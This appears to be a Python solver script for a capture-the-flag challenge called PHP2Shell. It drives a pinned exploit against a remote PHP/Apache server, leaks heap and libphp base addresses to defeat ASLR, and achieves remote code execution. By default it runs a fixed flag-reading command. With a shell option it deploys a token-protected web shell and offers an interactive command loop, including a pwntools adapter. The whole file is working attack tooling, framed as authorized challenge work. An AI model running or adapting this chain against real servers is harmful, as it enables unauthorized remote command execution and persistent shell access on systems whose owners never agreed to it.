#!/usr/bin/env python3
"""Remote solver for the PHP2Shell ASLR challenge.

The runner detects PHP from X-Powered-By (or accepts an explicit --version),
selects a calibrated profile, obtains both randomized bases at runtime, and
verifies a fixed proof before declaring success.
"""

from __future__ import annotations

import argparse
import json
import os
from collections import deque
import re
import urllib.error
import subprocess
import sys
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from threading import Event, Lock
from pathlib import Path

from bootstrap_upstream import EXPECTED_COMMIT, prepare


TARGET_PATH = "/index.php"
FETCH_PATH = "/proof/p"
TRIGGER = "cat /flag>/p"
SHELL_TRIGGER = "sh /s #AAAAA"

# Remote profiles are calibrated per exact PHP build. The header detector only
# selects a profile; it does not pretend that two builds of the same PHP
# version necessarily share libphp offsets or heap carrier geometry.
PROFILE_DIR = Path(__file__).resolve().parent / "profiles"

# These values are loaded from the selected JSON profile. They are offsets,
# not absolute addresses: ASLR is bypassed only after both runtime leaks.

ROOT = Path(__file__).resolve().parent.parent
VENDOR = Path(__file__).resolve().parent / "vendor" / "php2shell-upstream"
EXPLOIT = VENDOR / "exploit.py"


def fail(message: str) -> None:
    raise RuntimeError(message)


def normalize_target(raw: str) -> tuple[str, str]:
    """Normalize a player-supplied origin or PHP URL to the attack endpoint."""
    candidate = raw if "://" in raw else f"http://{raw}"
    parsed = urllib.parse.urlsplit(candidate)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        fail("target must be an http:// or https:// URL")
    if parsed.username or parsed.password:
        fail("credentials in the target URL are not supported")
    if parsed.query or parsed.fragment:
        fail("target URL must not contain a query string or fragment")

    netloc = parsed.hostname
    if parsed.port:
        netloc += f":{parsed.port}"
    origin = f"{parsed.scheme}://{netloc}"
    path = parsed.path or TARGET_PATH
    if path == "/":
        path = TARGET_PATH
    if not path.endswith(".php"):
        path = path.rstrip("/") + TARGET_PATH
    return f"{origin}{path}", origin


def request_headers(url: str, timeout: float) -> dict[str, str]:
    """Fetch response headers using the same runner identity as the exploit."""
    request = urllib.request.Request(
        url,
        headers={
            "User-Agent": "php2shell-remote-runner/1.0",
            "Accept": "text/plain, */*",
        },
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            if response.status != 200:
                fail(f"{url} returned HTTP {response.status}")
            # Consume one byte so urllib completes the header exchange reliably;
            # the target body is not needed for version detection.
            response.read(1)
            return {key.lower(): value for key, value in response.headers.items()}
    except Exception as exc:
        fail(f"cannot inspect {url}: {exc}")
    raise AssertionError


def php_version_from_headers(headers: dict[str, str]) -> str | None:
    """Extract an exact upstream PHP version from X-Powered-By."""
    value = headers.get("x-powered-by", "")
    match = re.search(
        r"(?:^|[,;])\s*PHP/(\d+\.\d+\.\d+)(?:$|[,;\s])",
        value,
        flags=re.IGNORECASE,
    )
    return match.group(1) if match else None


def resolve_php_version(headers: dict[str, str], forced: str | None) -> str:
    """Resolve the target version from headers, with explicit --version fallback."""
    detected = php_version_from_headers(headers)
    if detected and forced and detected != forced:
        fail(
            "PHP version mismatch: "
            f"X-Powered-By says {detected}, --version says {forced}"
        )
    if detected:
        print(f"[+] PHP version detected from X-Powered-By: {detected}")
        return detected
    if forced:
        print(f"[!] version no detectada, requiere --version; using {forced}")
        return forced
    fail("version no detectada, requiere --version")


def available_remote_profiles() -> dict[tuple[str, str], Path]:
    """Return verified RCE profiles usable by this remote runner."""
    profiles: dict[tuple[str, str], Path] = {}
    for path in sorted(PROFILE_DIR.glob("*.json")):
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            continue
        version = str(data.get("php_version", ""))
        arch = str(data.get("arch", ""))
        if (
            data.get("sapi") == "apache2handler"
            and arch in {"amd64", "aarch64"}
            and data.get("verified") is True
            and data.get("rce") is True
            and version
        ):
            profiles[(version, arch)] = path
    return profiles


def load_remote_profile(version: str, arch: str | None) -> dict:
    """Load an exact version/architecture calibrated remote profile."""
    profiles = available_remote_profiles()
    matches = {
        profile_arch: path
        for (profile_version, profile_arch), path in profiles.items()
        if profile_version == version
    }
    if not matches:
        supported = ", ".join(f"{v}/{a}" for (v, a) in sorted(profiles)) or "<none>"
        fail(f"PHP {version} has no verified remote profile (available: {supported})")

    if arch:
        path = matches.get(arch)
        if path is None:
            available = ", ".join(sorted(matches))
            fail(f"PHP {version}/{arch} has no verified profile (available: {available})")
    elif len(matches) == 1:
        arch, path = next(iter(matches.items()))
    else:
        available = ", ".join(sorted(matches))
        fail(f"PHP {version} has multiple architecture profiles; --arch is required ({available})")

    try:
        profile = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        fail(f"cannot load remote profile {path}: {exc}")

    required = ("php_version", "sapi", "arch", "libphp", "stages")
    if any(key not in profile for key in required):
        fail(f"remote profile is incomplete: {path}")
    if profile["php_version"] != version or profile["arch"] != arch:
        fail(f"remote profile identity mismatch in {path}")
    if profile["sapi"] != "apache2handler":
        fail(f"remote profile is not Apache mod_php: {path}")
    if profile.get("verified") is not True or profile.get("rce") is not True:
        fail(f"remote profile has not verified RCE: {path}")
    if any(key not in profile["libphp"] for key in ("zif_system", "zval_ptr_dtor", "htdata")):
        fail(f"remote profile lacks libphp offsets: {path}")
    if any(key not in profile["stages"] for key in ("stage1_n", "stage1_forge_len", "stage2_t", "stage2_v")):
        fail(f"remote profile lacks heap-stage calibration: {path}")

    print(f"[+] calibrated profile: {path.name}")
    print(
        "[!] header-only fingerprint trusts the calibrated official image; "
        "X-Powered-By does not disclose architecture or image digest"
    )
    return profile


def prepare_exploit() -> None:
    """Fetch the pinned primitive and verify its immutable git revision."""
    prepare(VENDOR)
    if not EXPLOIT.is_file():
        fail(f"pinned exploit is missing: {EXPLOIT}")
    try:
        result = subprocess.run(
            ["git", "rev-parse", "HEAD"],
            cwd=VENDOR,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
        )
        commit = result.stdout.strip()
    except (OSError, subprocess.CalledProcessError):
        commit = ""
    if commit != EXPECTED_COMMIT:
        fail(f"pinned exploit commit mismatch: {commit or '<unknown>'}")
    print(f"[+] pinned ASLR exploit: {EXPECTED_COMMIT[:12]}")


def parse_int(text: str) -> int:
    return int(text, 16)


def run_exploit(
    target: str,
    timeout: float,
    retries: int,
    profile: dict,
    shell_mode: bool = False,
    dump_root: Path | None = None,
    show_requests: bool = False,
) -> dict[str, int | str]:
    """Run the selected calibrated chain and recover both ASLR-winning bases."""
    trigger = SHELL_TRIGGER if shell_mode else TRIGGER
    libphp = profile["libphp"]
    stages = profile["stages"]
    zif_offset = int(str(libphp["zif_system"]), 0)
    dtor_offset = int(str(libphp["zval_ptr_dtor"]), 0)
    htdata_offset = int(str(libphp["htdata"]), 0)

    command = [
        sys.executable,
        str(EXPLOIT),
        "-u", target,
        "-c", trigger,
        "--profile", "bookworm",
        "--proof-file", "",
        "--fetch", FETCH_PATH,
        "--no-auto-offsets",
        "--zif-offset", f"0x{zif_offset:x}",
        "--dtor-offset", f"0x{dtor_offset:x}",
        "--htdata-offset", f"0x{htdata_offset:x}",
        "--retries", str(retries),
        "--timeout", str(timeout),
    ]
    environment = os.environ.copy()
    dump_dir: Path | None = None
    if dump_root is not None:
        dump_root.mkdir(parents=True, exist_ok=True)
        stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S.%fZ")
        dump_dir = dump_root.resolve() / f"run-{stamp}-{os.getpid()}"
        dump_dir.mkdir(parents=True, exist_ok=False)
        environment["P2S_REQUEST_DUMP_DIR"] = str(dump_dir)
        print(f"[*] request dump directory: {dump_dir}")

    if dump_root is not None or show_requests:
        environment["P2S_SHOW_REQUESTS"] = "1"
        print("[*] live request display: on")

    environment["P2S_STAGE1_N"] = str(stages["stage1_n"])
    environment["P2S_STAGE1_FORGE_LEN"] = str(stages["stage1_forge_len"])
    environment["P2S_STAGE2_T"] = str(stages["stage2_t"])
    environment["P2S_STAGE2_V"] = str(stages["stage2_v"])
    environment["P2S_STAGE3_STYLE"] = (
        "bookworm" if stages.get("stage3_carrier") is True else "lab"
    )

    mode = "remote shell deployment" if shell_mode else "fixed proof execution"
    print(f"[*] remote chain: OOM/stale state -> heap leak -> libphp leak -> {mode}")
    process = subprocess.Popen(
        command,
        cwd=str(VENDOR),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        env=environment,
    )

    chunk_base = 0
    libphp_base = 0
    htdata = 0
    zif_system = 0
    proof = ""

    assert process.stdout is not None
    # Parse the primitive's structured address lines and independently derive
    # the same final pointers below. A mismatch means profile/build drift.
    for line in process.stdout:
        print(line, end="")
        if match := re.search(r"chunk base = (0x[0-9a-fA-F]+)", line):
            chunk_base = parse_int(match.group(1))
        if match := re.search(r"libphp base = (0x[0-9a-fA-F]+)", line):
            libphp_base = parse_int(match.group(1))
        if match := re.search(r"HTDATA=(0x[0-9a-fA-F]+)", line):
            htdata = parse_int(match.group(1))
        if match := re.search(r"ZIF=(0x[0-9a-fA-F]+)", line):
            zif_system = parse_int(match.group(1))
        if line.startswith("PROOF: "):
            proof = line.removeprefix("PROOF: ").strip()

    returncode = process.wait()
    if returncode != 0:
        fail(f"remote exploit exited with status {returncode}")
    if not chunk_base or not libphp_base:
        fail("remote exploit did not disclose both ASLR bases")
    if not proof:
        fail("remote exploit completed without fetching the fixed proof")

    derived_htdata = chunk_base + htdata_offset
    derived_zif = libphp_base + zif_offset
    if htdata and htdata != derived_htdata:
        fail("HTDATA derivation mismatch")
    if zif_system and zif_system != derived_zif:
        fail("ZIF_SYSTEM derivation mismatch")

    return {
        "chunk_base": chunk_base,
        "libphp_base": libphp_base,
        "htdata": derived_htdata,
        "zif_system": derived_zif,
        "proof": proof,
        "request_dump_dir": str(dump_dir) if dump_dir else "",
    }


class RemoteShell:
    """Interactive command channel backed by the exploited PHP worker."""

    def __init__(self, origin: str, descriptor: dict[str, str], timeout: float) -> None:
        self.url = origin + descriptor["path"]
        self.token = descriptor["token"]
        self.timeout = timeout
        self.cwd = "/"

    def execute(self, command: str) -> tuple[str, str, int, str]:
        """Execute one command through the token-protected PHP bridge."""
        payload = json.dumps({"command": command, "cwd": self.cwd}).encode("utf-8")
        request = urllib.request.Request(
            self.url,
            data=payload,
            method="POST",
            headers={
                "Content-Type": "application/json",
                "X-P2S-Token": self.token,
                "User-Agent": "php2shell-remote-shell/1.0",
            },
        )
        try:
            with urllib.request.urlopen(request, timeout=self.timeout) as response:
                body = response.read().decode("utf-8", "replace")
                if response.status != 200:
                    raise RuntimeError(f"shell endpoint returned HTTP {response.status}")
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", "replace")
            raise RuntimeError(f"shell endpoint returned HTTP {exc.code}: {body.strip()}") from exc
        except urllib.error.URLError as exc:
            raise RuntimeError(f"shell endpoint request failed: {exc}") from exc

        try:
            result = json.loads(body)
        except json.JSONDecodeError as exc:
            raise RuntimeError(f"shell endpoint returned invalid JSON: {body[:200]!r}") from exc
        if not isinstance(result, dict) or "error" in result:
            raise RuntimeError(str(result.get("error", "unknown shell endpoint error")))

        return (
            str(result.get("stdout", "")),
            str(result.get("stderr", "")),
            int(result.get("exit_code", -1)),
            str(result.get("cwd", self.cwd)),
        )

    def interactive(self) -> None:
        """Provide a small stateful shell on top of one-shot HTTP commands."""
        print(f"[+] remote shell ready: {urllib.parse.urlsplit(self.url).path}")
        print("[+] type `exit` or Ctrl-D to leave; `cd` is tracked by the client")
        marker = "__P2S_CWD__"

        while True:
            try:
                line = input(f"www-data@php2shell:{self.cwd}$ ")
            except EOFError:
                break

            command = line.strip()
            if not command:
                continue
            if command in {"exit", "quit"}:
                break

            wrapped = command
            if command.startswith("cd "):
                wrapped = f"{command} && printf '\\n{marker}%s' \"$PWD\""

            try:
                stdout, stderr, exit_code, reported_cwd = self.execute(wrapped)
            except RuntimeError as exc:
                print(f"shell error: {exc}", file=sys.stderr)
                continue

            if marker in stdout:
                output, _, cwd_value = stdout.rpartition(marker)
                if cwd_value.startswith("/"):
                    self.cwd = cwd_value
                stdout = output
            else:
                self.cwd = reported_cwd

            if stdout:
                print(stdout, end="" if stdout.endswith("\n") else "\n")
            if stderr:
                print(stderr, end="" if stderr.endswith("\n") else "\n", file=sys.stderr)
            if exit_code != 0:
                print(f"[exit {exit_code}]", file=sys.stderr)


def make_pwn_tools_shell(shell: RemoteShell):
    """Create a pwntools tube adapter for the HTTP command bridge.

    pwntools' ``tube.interactive()`` expects stream-like ``send``/``recv``
    primitives. The challenge shell is instead a sequence of authenticated HTTP
    requests, so this adapter buffers one input line, executes it through the
    existing JSON endpoint, and exposes the response to pwntools as output.
    It keeps the standard shell as a dependency-free fallback.
    """
    try:
        from pwnlib.tubes.tube import tube
    except ImportError as exc:  # pragma: no cover - exercised only without pwntools
        fail("pwntools is required for --pwn-interactive (pip install pwntools)")
        raise

    class PwnToolsHttpShell(tube):
        def __init__(self) -> None:
            super().__init__()
            self.shell = shell
            self.pending_input = bytearray()
            self.outputs: deque[bytes] = deque()
            self.output_available = Event()
            self.output_lock = Lock()
            self.closed = False

        def _queue_output(self, data: str) -> None:
            if not data:
                return
            with self.output_lock:
                self.outputs.append(data.encode("utf-8"))
            self.output_available.set()

        def _execute_line(self, line: str) -> None:
            command = line.strip()
            if not command:
                return
            if command in {"exit", "quit"}:
                self.close()
                return

            marker = "__P2S_CWD__"
            wrapped = command
            if command.startswith("cd "):
                wrapped = f"{command} && printf '\\n{marker}%s' \"$PWD\""

            try:
                stdout, stderr, exit_code, reported_cwd = self.shell.execute(wrapped)
            except RuntimeError as exc:
                self._queue_output(f"shell error: {exc}\\n")
                return

            if marker in stdout:
                output, _, cwd_value = stdout.rpartition(marker)
                if cwd_value.startswith("/"):
                    self.shell.cwd = cwd_value
                stdout = output
            else:
                self.shell.cwd = reported_cwd

            output = stdout
            if output and not output.endswith("\n"):
                output += "\n"
            if stderr:
                output += stderr if stderr.endswith("\n") else stderr + "\n"
            if exit_code != 0:
                output += f"[exit {exit_code}]\\n"
            self._queue_output(output)

        def send_raw(self, data: bytes) -> None:
            if self.closed:
                raise EOFError("pwntools HTTP shell is closed")
            self.pending_input.extend(data)
            while b"\n" in self.pending_input:
                raw_line, _, remainder = self.pending_input.partition(b"\n")
                self.pending_input = bytearray(remainder)
                self._execute_line(raw_line.decode("utf-8", "replace").rstrip("\r"))
                if self.closed:
                    return

        def recv_raw(self, numb: int) -> bytes | None:
            # ``interactive()`` polls at 50 ms; a short wait avoids a busy loop.
            if not self.output_available.wait(0.05):
                if self.closed:
                    raise EOFError("pwntools HTTP shell is closed")
                return None

            with self.output_lock:
                if not self.outputs:
                    self.output_available.clear()
                    if self.closed:
                        raise EOFError("pwntools HTTP shell is closed")
                    return None
                data = self.outputs.popleft()
                result = data[:numb]
                remainder = data[numb:]
                if remainder:
                    self.outputs.appendleft(remainder)
                else:
                    self.output_available.clear()
            return result

        def settimeout_raw(self, timeout) -> None:  # noqa: ANN001 - pwntools sentinel
            return None

        def can_recv_raw(self, timeout) -> bool:  # noqa: ANN001 - pwntools sentinel
            return self.output_available.wait(0.05)

        def connected_raw(self, direction: str = "any") -> bool:
            return not self.closed

        def close(self) -> None:
            self.closed = True
            self.output_available.set()

    return PwnToolsHttpShell()



def write_report(
    target: str,
    result: dict[str, int | str],
    profile: dict,
    report_path: Path,
) -> None:
    """Write an auditable ASLR derivation rather than only a success flag."""
    chunk_base = int(result["chunk_base"])
    libphp_base = int(result["libphp_base"])
    libphp = profile["libphp"]
    zif_offset = int(str(libphp["zif_system"]), 0)
    dtor_offset = int(str(libphp["zval_ptr_dtor"]), 0)
    htdata_offset = int(str(libphp["htdata"]), 0)

    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "scope": "authorized PHP2Shell challenge",
        "target": target,
        "php_version": profile["php_version"],
        "arch": profile["arch"],
        "profile_image": profile.get("image"),
        "upstream_commit": EXPECTED_COMMIT,
        "aslr": {
            "remote_kernel_setting": "not observable by design",
            "bypass_method": "runtime information disclosure",
            "stage_1": {
                "name": "Zend heap chunk leak",
                "result": f"0x{chunk_base:x}",
            },
            "stage_2": {
                "name": "libphp.so load-base leak",
                "result": f"0x{libphp_base:x}",
            },
            "constant_offsets": {
                "zif_system": f"0x{zif_offset:x}",
                "zval_ptr_dtor": f"0x{dtor_offset:x}",
                "htdata": f"0x{htdata_offset:x}",
            },
            "derived_addresses": {
                "htdata": f"0x{int(result['htdata']):x}",
                "zif_system": f"0x{int(result['zif_system']):x}",
                "htdata_formula": f"zend_chunk_base + 0x{htdata_offset:x}",
                "zif_system_formula": f"libphp_base + 0x{zif_offset:x}",
            },
        },
        "request_dump_dir": str(result.get("request_dump_dir", "")),
        "proof_received": True,
    }
    report_path.write_text(json.dumps(report, indent=2) + "\n", encoding="utf-8")
    print(f"[+] ASLR report: {report_path}")


def main() -> int:
    profiles = available_remote_profiles()
    parser = argparse.ArgumentParser(
        description="Solve the remote PHP2Shell ASLR challenge with a fixed proof command",
    )
    parser.add_argument("target", help="published challenge URL, for example http://challenge.example:8426")
    parser.add_argument("--timeout", type=float, default=60.0)
    parser.add_argument("--retries", type=int, default=3)
    parser.add_argument(
        "--version",
        choices=sorted({version for version, _architecture in profiles}),
        help="force a calibrated PHP version when X-Powered-By is absent or hidden",
    )
    parser.add_argument(
        "--dump-requests",
        type=Path,
        metavar="DIR",
        help="archive exact request/response bytes under DIR (gzip plus JSON metadata)",
    )
    parser.add_argument(
        "--show-requests",
        action="store_true",
        help="print each real exploit request/response summary live",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="resolve the target/profile and print the plan without exploitation",
    )
    parser.add_argument(
        "--arch",
        choices=sorted({architecture for _version, architecture in profiles}),
        help="target architecture; required when a version has multiple profiles",
    )
    parser.add_argument(
        "--report",
        type=Path,
        default=Path("php2shell-aslr-report.json"),
        help="output path for the explicit ASLR derivation report",
    )
    parser.add_argument(
        "--shell",
        action="store_true",
        help="deploy a token-protected interactive shell after bypassing ASLR",
    )
    parser.add_argument(
        "--pwn-interactive",
        action="store_true",
        help="use pwntools tube.interactive() for --shell (optional dependency)",
    )
    args = parser.parse_args()

    if args.timeout <= 0 or args.retries <= 0:
        parser.error("--timeout and --retries must be positive")
    if args.pwn_interactive and not args.shell:
        parser.error("--pwn-interactive requires --shell")
    if args.dump_requests and args.dry_run:
        parser.error("--dump-requests cannot be combined with --dry-run")
    if args.show_requests and args.dry_run:
        parser.error("--show-requests cannot be combined with --dry-run")
    selected_trigger = SHELL_TRIGGER if args.shell else TRIGGER
    if len(selected_trigger.encode()) > 14:
        fail("internal trigger exceeds the 14-byte payload carrier")

    target, origin = normalize_target(args.target)
    print(f"[*] target: {target}")
    if args.shell:
        print("[*] deployment command: sh /s #AAAAA")
    else:
        print("[*] fixed proof command: cat /flag >/p")

    headers = request_headers(target, args.timeout)
    version = resolve_php_version(headers, args.version)
    profile = load_remote_profile(version, args.arch)
    if args.dry_run:
        libphp = profile["libphp"]
        print("[+] dry-run profile resolved")
        print(f"    image     : {profile.get('image', '?')}")
        print(f"    arch      : {profile['arch']}")
        print(f"    zif_system: {libphp['zif_system']}")
        print(f"    dtor      : {libphp['zval_ptr_dtor']}")
        print(f"    htdata    : {libphp['htdata']}")
        return 0

    prepare_exploit()
    result = run_exploit(
        target,
        args.timeout,
        args.retries,
        profile,
        shell_mode=args.shell,
        dump_root=args.dump_requests,
        show_requests=args.show_requests,
    )

    print("\n[+] ASLR derivation")
    print(f"    PHP version          : {version} ({profile['arch']})")
    print(f"    Zend heap chunk base : 0x{int(result['chunk_base']):x}")
    print(f"    libphp.so base       : 0x{int(result['libphp_base']):x}")
    print(f"    HTDATA               : 0x{int(result['htdata']):x}")
    print(f"    zif_system           : 0x{int(result['zif_system']):x}")
    print("[+] ASLR_BYPASS=yes")

    if args.shell:
        try:
            descriptor = json.loads(str(result["proof"]))
        except json.JSONDecodeError as exc:
            fail(f"shell deployment returned invalid session JSON: {result['proof']!r}")
        if (
            not isinstance(descriptor, dict)
            or not descriptor.get("path")
            or not descriptor.get("token")
        ):
            fail(f"shell deployment returned an invalid descriptor: {result['proof']!r}")
        write_report(target, result, profile, args.report)
        remote_shell = RemoteShell(origin, descriptor, args.timeout)
        if args.pwn_interactive:
            print(f"[+] pwntools remote shell ready: {urllib.parse.urlsplit(remote_shell.url).path}")
            print("[+] type `exit` or Ctrl-D to leave; `cd` is tracked by the adapter")
            make_pwn_tools_shell(remote_shell).interactive(prompt="www-data@php2shell:$ ")
        else:
            remote_shell.interactive()
        return 0

    print(f"FLAG: {result['proof']}")
    write_report(target, result, profile, args.report)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise SystemExit(130)
    except RuntimeError as exc:
        print(f"ERROR: {exc}", file=sys.stderr)
        raise SystemExit(1)
